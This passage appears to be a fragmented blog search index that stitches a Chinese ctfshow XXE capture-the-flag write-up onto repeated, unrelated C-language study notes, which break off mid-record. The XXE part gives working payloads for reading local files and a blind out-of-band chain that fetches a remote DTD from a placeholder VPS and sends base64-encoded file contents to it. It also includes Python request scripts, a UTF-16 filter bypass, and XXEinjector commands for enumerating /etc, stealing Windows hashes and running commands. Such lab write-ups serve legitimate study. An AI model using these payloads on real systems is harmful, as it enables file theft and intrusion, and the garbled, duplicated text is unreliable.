nMask\"\u003e]\u003e \u0026name; 若页面输出my name is nMask则说明xml可以被解析 随后检测服务器是否支持DTD引用外部实体 \u003c?xml version=”1.0” encoding=”UTF-8”?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY % name SYSTEM \"http://localhost/index.html\"\u003e %name; ]\u003e 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。若支持引用外部实体，则页面很有可能存在xxe漏洞。 漏洞利用\r文件读取 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY name SYSTEM \"file://c:\\test.txt\"\u003e]\u003e \u0026name; or（2023 moectf payload） \u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY b SYSTEM \"file:///flag\"\u003e ]\u003e \u0026b; Blind XXE漏洞针对无回显的xxe漏洞，我们可以通过构造一个外带信道来带出数据 在自己的vps服务器上创建test.php写入以下内容： \u003c?php file_put_contents(\"test.txt\", $_GET['file']) ; ?\u003e 在目标服务器上创建index.php写入以下内容： \u003c?php $xml=\u003c\u003c","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:5","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#文件读取"},{"categories":["CTF","web"],"content":"\rxxe漏洞XXE(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时， 没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、 发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 漏洞检测首先检测XML是否会被成功解析： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY name \"my name is nMask\"\u003e]\u003e \u0026name; 若页面输出my name is nMask则说明xml可以被解析 随后检测服务器是否支持DTD引用外部实体 \u003c?xml version=”1.0” encoding=”UTF-8”?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY % name SYSTEM \"http://localhost/index.html\"\u003e %name; ]\u003e 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。若支持引用外部实体，则页面很有可能存在xxe漏洞。 漏洞利用\r文件读取 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY name SYSTEM \"file://c:\\test.txt\"\u003e]\u003e \u0026name; or（2023 moectf payload） \u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY b SYSTEM \"file:///flag\"\u003e ]\u003e \u0026b; Blind XXE漏洞针对无回显的xxe漏洞，我们可以通过构造一个外带信道来带出数据 在自己的vps服务器上创建test.php写入以下内容： \u003c?php file_put_contents(\"test.txt\", $_GET['file']) ; ?\u003e 在目标服务器上创建index.php写入以下内容： \u003c?php $xml=\u003c\u003c","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:5","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#blind-xxe漏洞"},{"categories":["CTF","web"],"content":"\rXXEinjector枚举HTTPS应用程序中的/etc目录： ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl 使用gopher（OOB方法）枚举/etc目录： ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher 二次漏洞利用： ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt 使用HTTP带外方法和netdoc协议对文件进行爆破攻击： ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc 通过直接性漏洞利用方式进行资源枚举： ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK 枚举未过滤的端口： ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all 窃取Windows哈希： ruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes 使用Java jar上传文件： ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf 使用PHP expect执行系统指令： ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls 测试XSLT注入： ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt 记录请求信息： ruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:6","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#xxeinjector"},{"categories":["CTF","web"],"content":"\r靶场题目","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:0","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#靶场题目"},{"categories":["CTF","web"],"content":"\r[web373]有回显XXE，外部实体 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2021-01-07 12:59:52 # @Last Modified by: h1xa # @Last Modified time: 2021-01-07 13:36:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-\u003eloadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $ctfshow = $creds-\u003ectfshow; echo $ctfshow; } highlight_file(__FILE__); payload： \u003c!DOCTYPE hacker[ \u003c!ENTITY hacker SYSTEM \"file:///flag\"\u003e ]\u003e \u003croot\u003e \u003cctfshow\u003e \u0026hacker; \u003c/ctfshow\u003e \u003c/root\u003e ","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:1","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#web373"},{"categories":["CTF","web"],"content":"\r[web374]无回显XXE ，外部实体。 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2021-01-07 12:59:52 # @Last Modified by: h1xa # @Last Modified time: 2021-01-07 13:36:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-\u003eloadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); } highlight_file(__FILE__); 无回显，考虑数据外带，访问一个请求，把数据加到请求上。 payload： \u003c!DOCTYPE hacker[ \u003c!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"\u003e \u003c!ENTITY % myurl SYSTEM \"http://vps-ip/test.dtd\"\u003e %myurl; ]\u003e \u003croot\u003e 1 \u003c/root\u003e tips： \u003c!-- 要引用（dtd里面），所以要加百分号% --\u003e \u003c!-- /flag 改成 /etc/passwd 可能会失败，因为内容太多了 --\u003e \u003c!-- 不能直接\u003c!ENTITY % myurl SYSTEM \"http://vps-ip:port/%file\"\u003e ，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制--\u003e \u003c!-- %myurl;会读取远程dtd文件，读到了以后，因为远程dtd文件有一个实体的定义（% dtd），那么就会解析这个实体定义。（% dtd）实体的定义内容是另外一个实体定义（\u0026#x25; vps），那就会解析（\u0026#x25; vps），就会执行远程请求，请求地址（http://vps-ip:port/%file），会在我们的vps日志上留下痕迹。 也可以起nc监听端口，能判断是否有向我们的vps发送请求以及请求内容。起nc的话% myurl的值，不要加端口，就vps-ip够了。 总结就是，%myurl 这种引用会自动向地址发送请求。 --\u003e test.dtd（放vps上面）内容 \u003c!ENTITY % dtd \"\u003c!ENTITY \u0026#x25; vps SYSTEM 'http://vps-ip:port/%file;'\u003e \"\u003e \u003c!-- \u0026#x25; 就是百分号（\u0026#x25; vps=% vps），因为是嵌套在里面的引用，不能直接写百分号 --\u003e \u003c!-- 如果选择nc监听的话，端口一定要加！！！ --\u003e \u003c!-- 如果选择看日志的话，端口一定不能加！！！ --\u003e \u003c!-- 引用（执行）dtd实体，vps被注册 --\u003e %dtd; \u003c!-- 引用（执行）vps实体，接收%file变量的内容 --\u003e %vps; 然后base64解码即可得到flag 也可以通过python脚本发包： import requests url = '' payload = \"\"\"\u003c!DOCTYPE test [ \u003c!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"\u003e \u003c!ENTITY % aaa SYSTEM \"http://vps-ip/text.dtd\"\u003e %aaa; ]\u003e \u003croot\u003e123\u003c/root\u003e\"\"\" payload = payload.encode('utf-8') requests.post(url ,data=payload) ","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:2","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#web374"},{"categories":["CTF","web"],"content":"\r[web375] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2021-01-07 12:59:52 # @Last Modified by: h1xa # @Last Modified time: 2021-01-07 15:22:05 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); if(preg_match('/\u003c\\?xml version=\"1\\.0\"/', $xmlfile)){ die('error'); } if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-\u003eloadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); } highlight_file(__FILE__); 加了个正则匹配，可以不写XML声明绕过，也可以多敲一个空格绕过 ","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:3","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#web375"},{"categories":["CTF","web"],"content":"\r[web376] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2021-01-07 12:59:52 # @Last Modified by: h1xa # @Last Modified time: 2021-01-07 15:23:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); if(preg_match('/\u003c\\?xml version=\"1\\.0\"/i', $xmlfile)){ die('error'); } if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-\u003eloadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); } highlight_file(__FILE__); 相比web375，本题多了\"/i\"，不区分大小写，当然我们也可以通过不写XML声明绕过，也可以打一个空格在?xml和version之间绕过，也可以将\u003c\\?xml version=\"1\\.0\"中的双引号换成单引号绕过 ","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:4","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#web376"},{"categories":["CTF","web"],"content":"\r[web377] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2021-01-07 12:59:52 # @Last Modified by: h1xa # @Last Modified time: 2021-01-07 15:26:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); if(preg_match('/\u003c\\?xml version=\"1\\.0\"|http/i', $xmlfile)){ die('error'); } if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-\u003eloadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); } highlight_file(__FILE__); 比之前几题多过滤了一个http 可以采用编码绕过，用脚本把web374的payload转为utf-16编码。 一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。 import requests url = 'http://a83196d0-7399-4a44-9601-23509c34a124.challenge.ctf.show/' #注意这里是单引号，为了绕过过滤 payload = \"\"\"\u003c?xml version='1.0' encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE hacker[ \u003c!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"\u003e \u003c!ENTITY % myurl SYSTEM \"http://vps-ip/test.dtd\"\u003e %myurl; ]\u003e \u003croot\u003e 1 \u003c/root\u003e \"\"\" payload = payload.encode('utf-16') print(requests.post(url ,data=payload).text) ","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:5","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#web377"},{"categories":["CTF","web"],"content":"\r[web378]开题可见 抓包看一下，xxe无疑了 部分源码： function doLogin(){ var username = $(\"#username\").val(); var password = $(\"#password\").val(); if(username == \"\" || password == \"\"){ alert(\"Please enter the username and password!\"); return; } var data = \"\u003cuser\u003e\u003cusername\u003e\" + username + \"\u003c/username\u003e\u003cpassword\u003e\" + password + \"\u003c/password\u003e\u003c/user\u003e\"; $.ajax({ type: \"POST\", url: \"doLogin\", contentType: \"application/xml;charset=utf-8\", data: data, dataType: \"xml\", anysc: false, success: function (result) { var code = result.getElementsByTagName(\"code\")[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(\"msg\")[0].childNodes[0].nodeValue; if(code == \"0\"){ $(\".msg\").text(msg + \" login fail!\"); }else if(code == \"1\"){ $(\".msg\").text(msg + \" login success!\"); }else{ $(\".msg\").text(\"error:\" + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(\".msg\").text(errorThrown + ':' + textStatus); } }); } payload: \u003c!DOCTYPE test [ \u003c!ENTITY xxe SYSTEM \"file:///flag\"\u003e ]\u003e \u003cuser\u003e\u003cusername\u003e\u0026xxe;\u003c/username\u003e\u003cpassword\u003e\u0026xxe;\u003c/password\u003e\u003c/user\u003e ","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:6","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#web378"},{"categories":["Programing"],"content":"C语言学习笔记以及希冀平台样题 ","date":"2023-11-17","objectID":"/c_language_notes/:0:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#"},{"categories":["Programing"],"content":"\rC语言一刷的时候是没有笔记的，开刷Python之后才开始整理笔记，今天开始C语言二刷，顺便做做题，笔记的框架是根据浙大翁凯教授的慕课构建的，随后又根据学校的考试内容进行了整体补充插入，可能会出现小部分内容重复，也可能会存在插入知识点跟前后关联性较小等问题，同时也插入了学校教材中的习题 ","date":"2023-11-17","objectID":"/c_language_notes/:0:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#c语言一刷的时候是没有笔记的开刷python之后才开始整理笔记今天开始c语言二刷顺便做做题笔记的框架是根据浙大翁凯教授的慕课构建的随后又根据学校的考试内容进行了整体补充插入可能会出现小部分内容重复也可能会存在插入知识点跟前后关联性较小等问题同时也插入了学校教材中的习题"},{"categories":["Programing"],"content":"\r1.1解释型语言\u0026编译型语言 有的编程语言要求必须提前将所有源代码一次性转换成二进制指令，也就是生成一个可执行程序（Windows 下的 .exe），比如C语言、C++、Golang、Pascal（Delphi）、汇编等，这种编程语言称为编译型语言，使用的转换工具称为编译器。(编译型) 有的编程语言可以一边执行一边转换，需要哪些源代码就转换哪些源代码，不会生成可执行程序，比如 Python、JavaScript、PHP、Shell、MATLAB 等，这种编程语言称为解释型语言，使用的转换工具称为解释器。(解释型) ","date":"2023-11-17","objectID":"/c_language_notes/:1:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#11解释型语言编译型语言"},{"categories":["Programing"],"content":"\r2.1计算printf(“xx”); 打印xx scanf(\"%d\",\u0026price); 将读取到的整数赋值给price const是一个修饰符，加载变量类型前面，表示“ 不变的”这一属性，即常量 const int AMOUNT = 100 常量变量名常用全大写 浮点数带小数点的数值，浮点数这个词的本意就是指小数点是浮动的，是计算机内部表达非整数(包含分数和无理数)的一种方式，另一种方式叫做定点数(在c语言中不会遇到定点数) 当浮点数和证书放到一起运算时，C会将整数转换成浮点数，然后进行浮点数的运算 double双精度浮点数，还有float表示单精度浮点数 改进后的例子： 身高单位换算 #include\u003cstdio.h\u003e int main() { printf(\"请分别输入身高的英尺和英寸，\" 如输入\\\"5 7\\\"表示5英尺7英寸：”)； double foot; double inch; scanf(\"%lf %lf\",\u0026foot,\u0026inch); print(\"身高是%f米。\\n\",((foot + inch /12)* 0.3048)); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:2:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#21计算"},{"categories":["Programing"],"content":"\r2.1计算printf(“xx”); 打印xx scanf(\"%d\",\u0026price); 将读取到的整数赋值给price const是一个修饰符，加载变量类型前面，表示“ 不变的”这一属性，即常量 const int AMOUNT = 100 常量变量名常用全大写 浮点数带小数点的数值，浮点数这个词的本意就是指小数点是浮动的，是计算机内部表达非整数(包含分数和无理数)的一种方式，另一种方式叫做定点数(在c语言中不会遇到定点数) 当浮点数和证书放到一起运算时，C会将整数转换成浮点数，然后进行浮点数的运算 double双精度浮点数，还有float表示单精度浮点数 改进后的例子： 身高单位换算 #include int main() { printf(\"请分别输入身高的英尺和英寸，\" 如输入\\\"5 7\\\"表示5英尺7英寸：”)； double foot; double inch; scanf(\"%lf %lf\",\u0026foot,\u0026inch); print(\"身高是%f米。\\n\",((foot + inch /12)* 0.3048)); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:2:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#const"},{"categories":["Programing"],"content":"\r2.1计算printf(“xx”); 打印xx scanf(\"%d\",\u0026price); 将读取到的整数赋值给price const是一个修饰符，加载变量类型前面，表示“ 不变的”这一属性，即常量 const int AMOUNT = 100 常量变量名常用全大写 浮点数带小数点的数值，浮点数这个词的本意就是指小数点是浮动的，是计算机内部表达非整数(包含分数和无理数)的一种方式，另一种方式叫做定点数(在c语言中不会遇到定点数) 当浮点数和证书放到一起运算时，C会将整数转换成浮点数，然后进行浮点数的运算 double双精度浮点数，还有float表示单精度浮点数 改进后的例子： 身高单位换算 #include int main() { printf(\"请分别输入身高的英尺和英寸，\" 如输入\\\"5 7\\\"表示5英尺7英寸：”)； double foot; double inch; scanf(\"%lf %lf\",\u0026foot,\u0026inch); print(\"身高是%f米。\\n\",((foot + inch /12)* 0.3048)); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:2:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#浮点数"},{"categories":["Programing"],"content":"\r2.1计算printf(“xx”); 打印xx scanf(\"%d\",\u0026price); 将读取到的整数赋值给price const是一个修饰符，加载变量类型前面，表示“ 不变的”这一属性，即常量 const int AMOUNT = 100 常量变量名常用全大写 浮点数带小数点的数值，浮点数这个词的本意就是指小数点是浮动的，是计算机内部表达非整数(包含分数和无理数)的一种方式，另一种方式叫做定点数(在c语言中不会遇到定点数) 当浮点数和证书放到一起运算时，C会将整数转换成浮点数，然后进行浮点数的运算 double双精度浮点数，还有float表示单精度浮点数 改进后的例子： 身高单位换算 #include int main() { printf(\"请分别输入身高的英尺和英寸，\" 如输入\\\"5 7\\\"表示5英尺7英寸：”)； double foot; double inch; scanf(\"%lf %lf\",\u0026foot,\u0026inch); print(\"身高是%f米。\\n\",((foot + inch /12)* 0.3048)); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:2:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#double"},{"categories":["Programing"],"content":"\r2.1计算printf(“xx”); 打印xx scanf(\"%d\",\u0026price); 将读取到的整数赋值给price const是一个修饰符，加载变量类型前面，表示“ 不变的”这一属性，即常量 const int AMOUNT = 100 常量变量名常用全大写 浮点数带小数点的数值，浮点数这个词的本意就是指小数点是浮动的，是计算机内部表达非整数(包含分数和无理数)的一种方式，另一种方式叫做定点数(在c语言中不会遇到定点数) 当浮点数和证书放到一起运算时，C会将整数转换成浮点数，然后进行浮点数的运算 double双精度浮点数，还有float表示单精度浮点数 改进后的例子： 身高单位换算 #include int main() { printf(\"请分别输入身高的英尺和英寸，\" 如输入\\\"5 7\\\"表示5英尺7英寸：”)； double foot; double inch; scanf(\"%lf %lf\",\u0026foot,\u0026inch); print(\"身高是%f米。\\n\",((foot + inch /12)* 0.3048)); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:2:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#身高单位换算"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include \u003cstdio.h\u003e int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include\u003cstdio.h\u003e int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#22表达式"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#运算符"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#算子"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#计算时间差"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#求平均值"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#运算符优先级"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 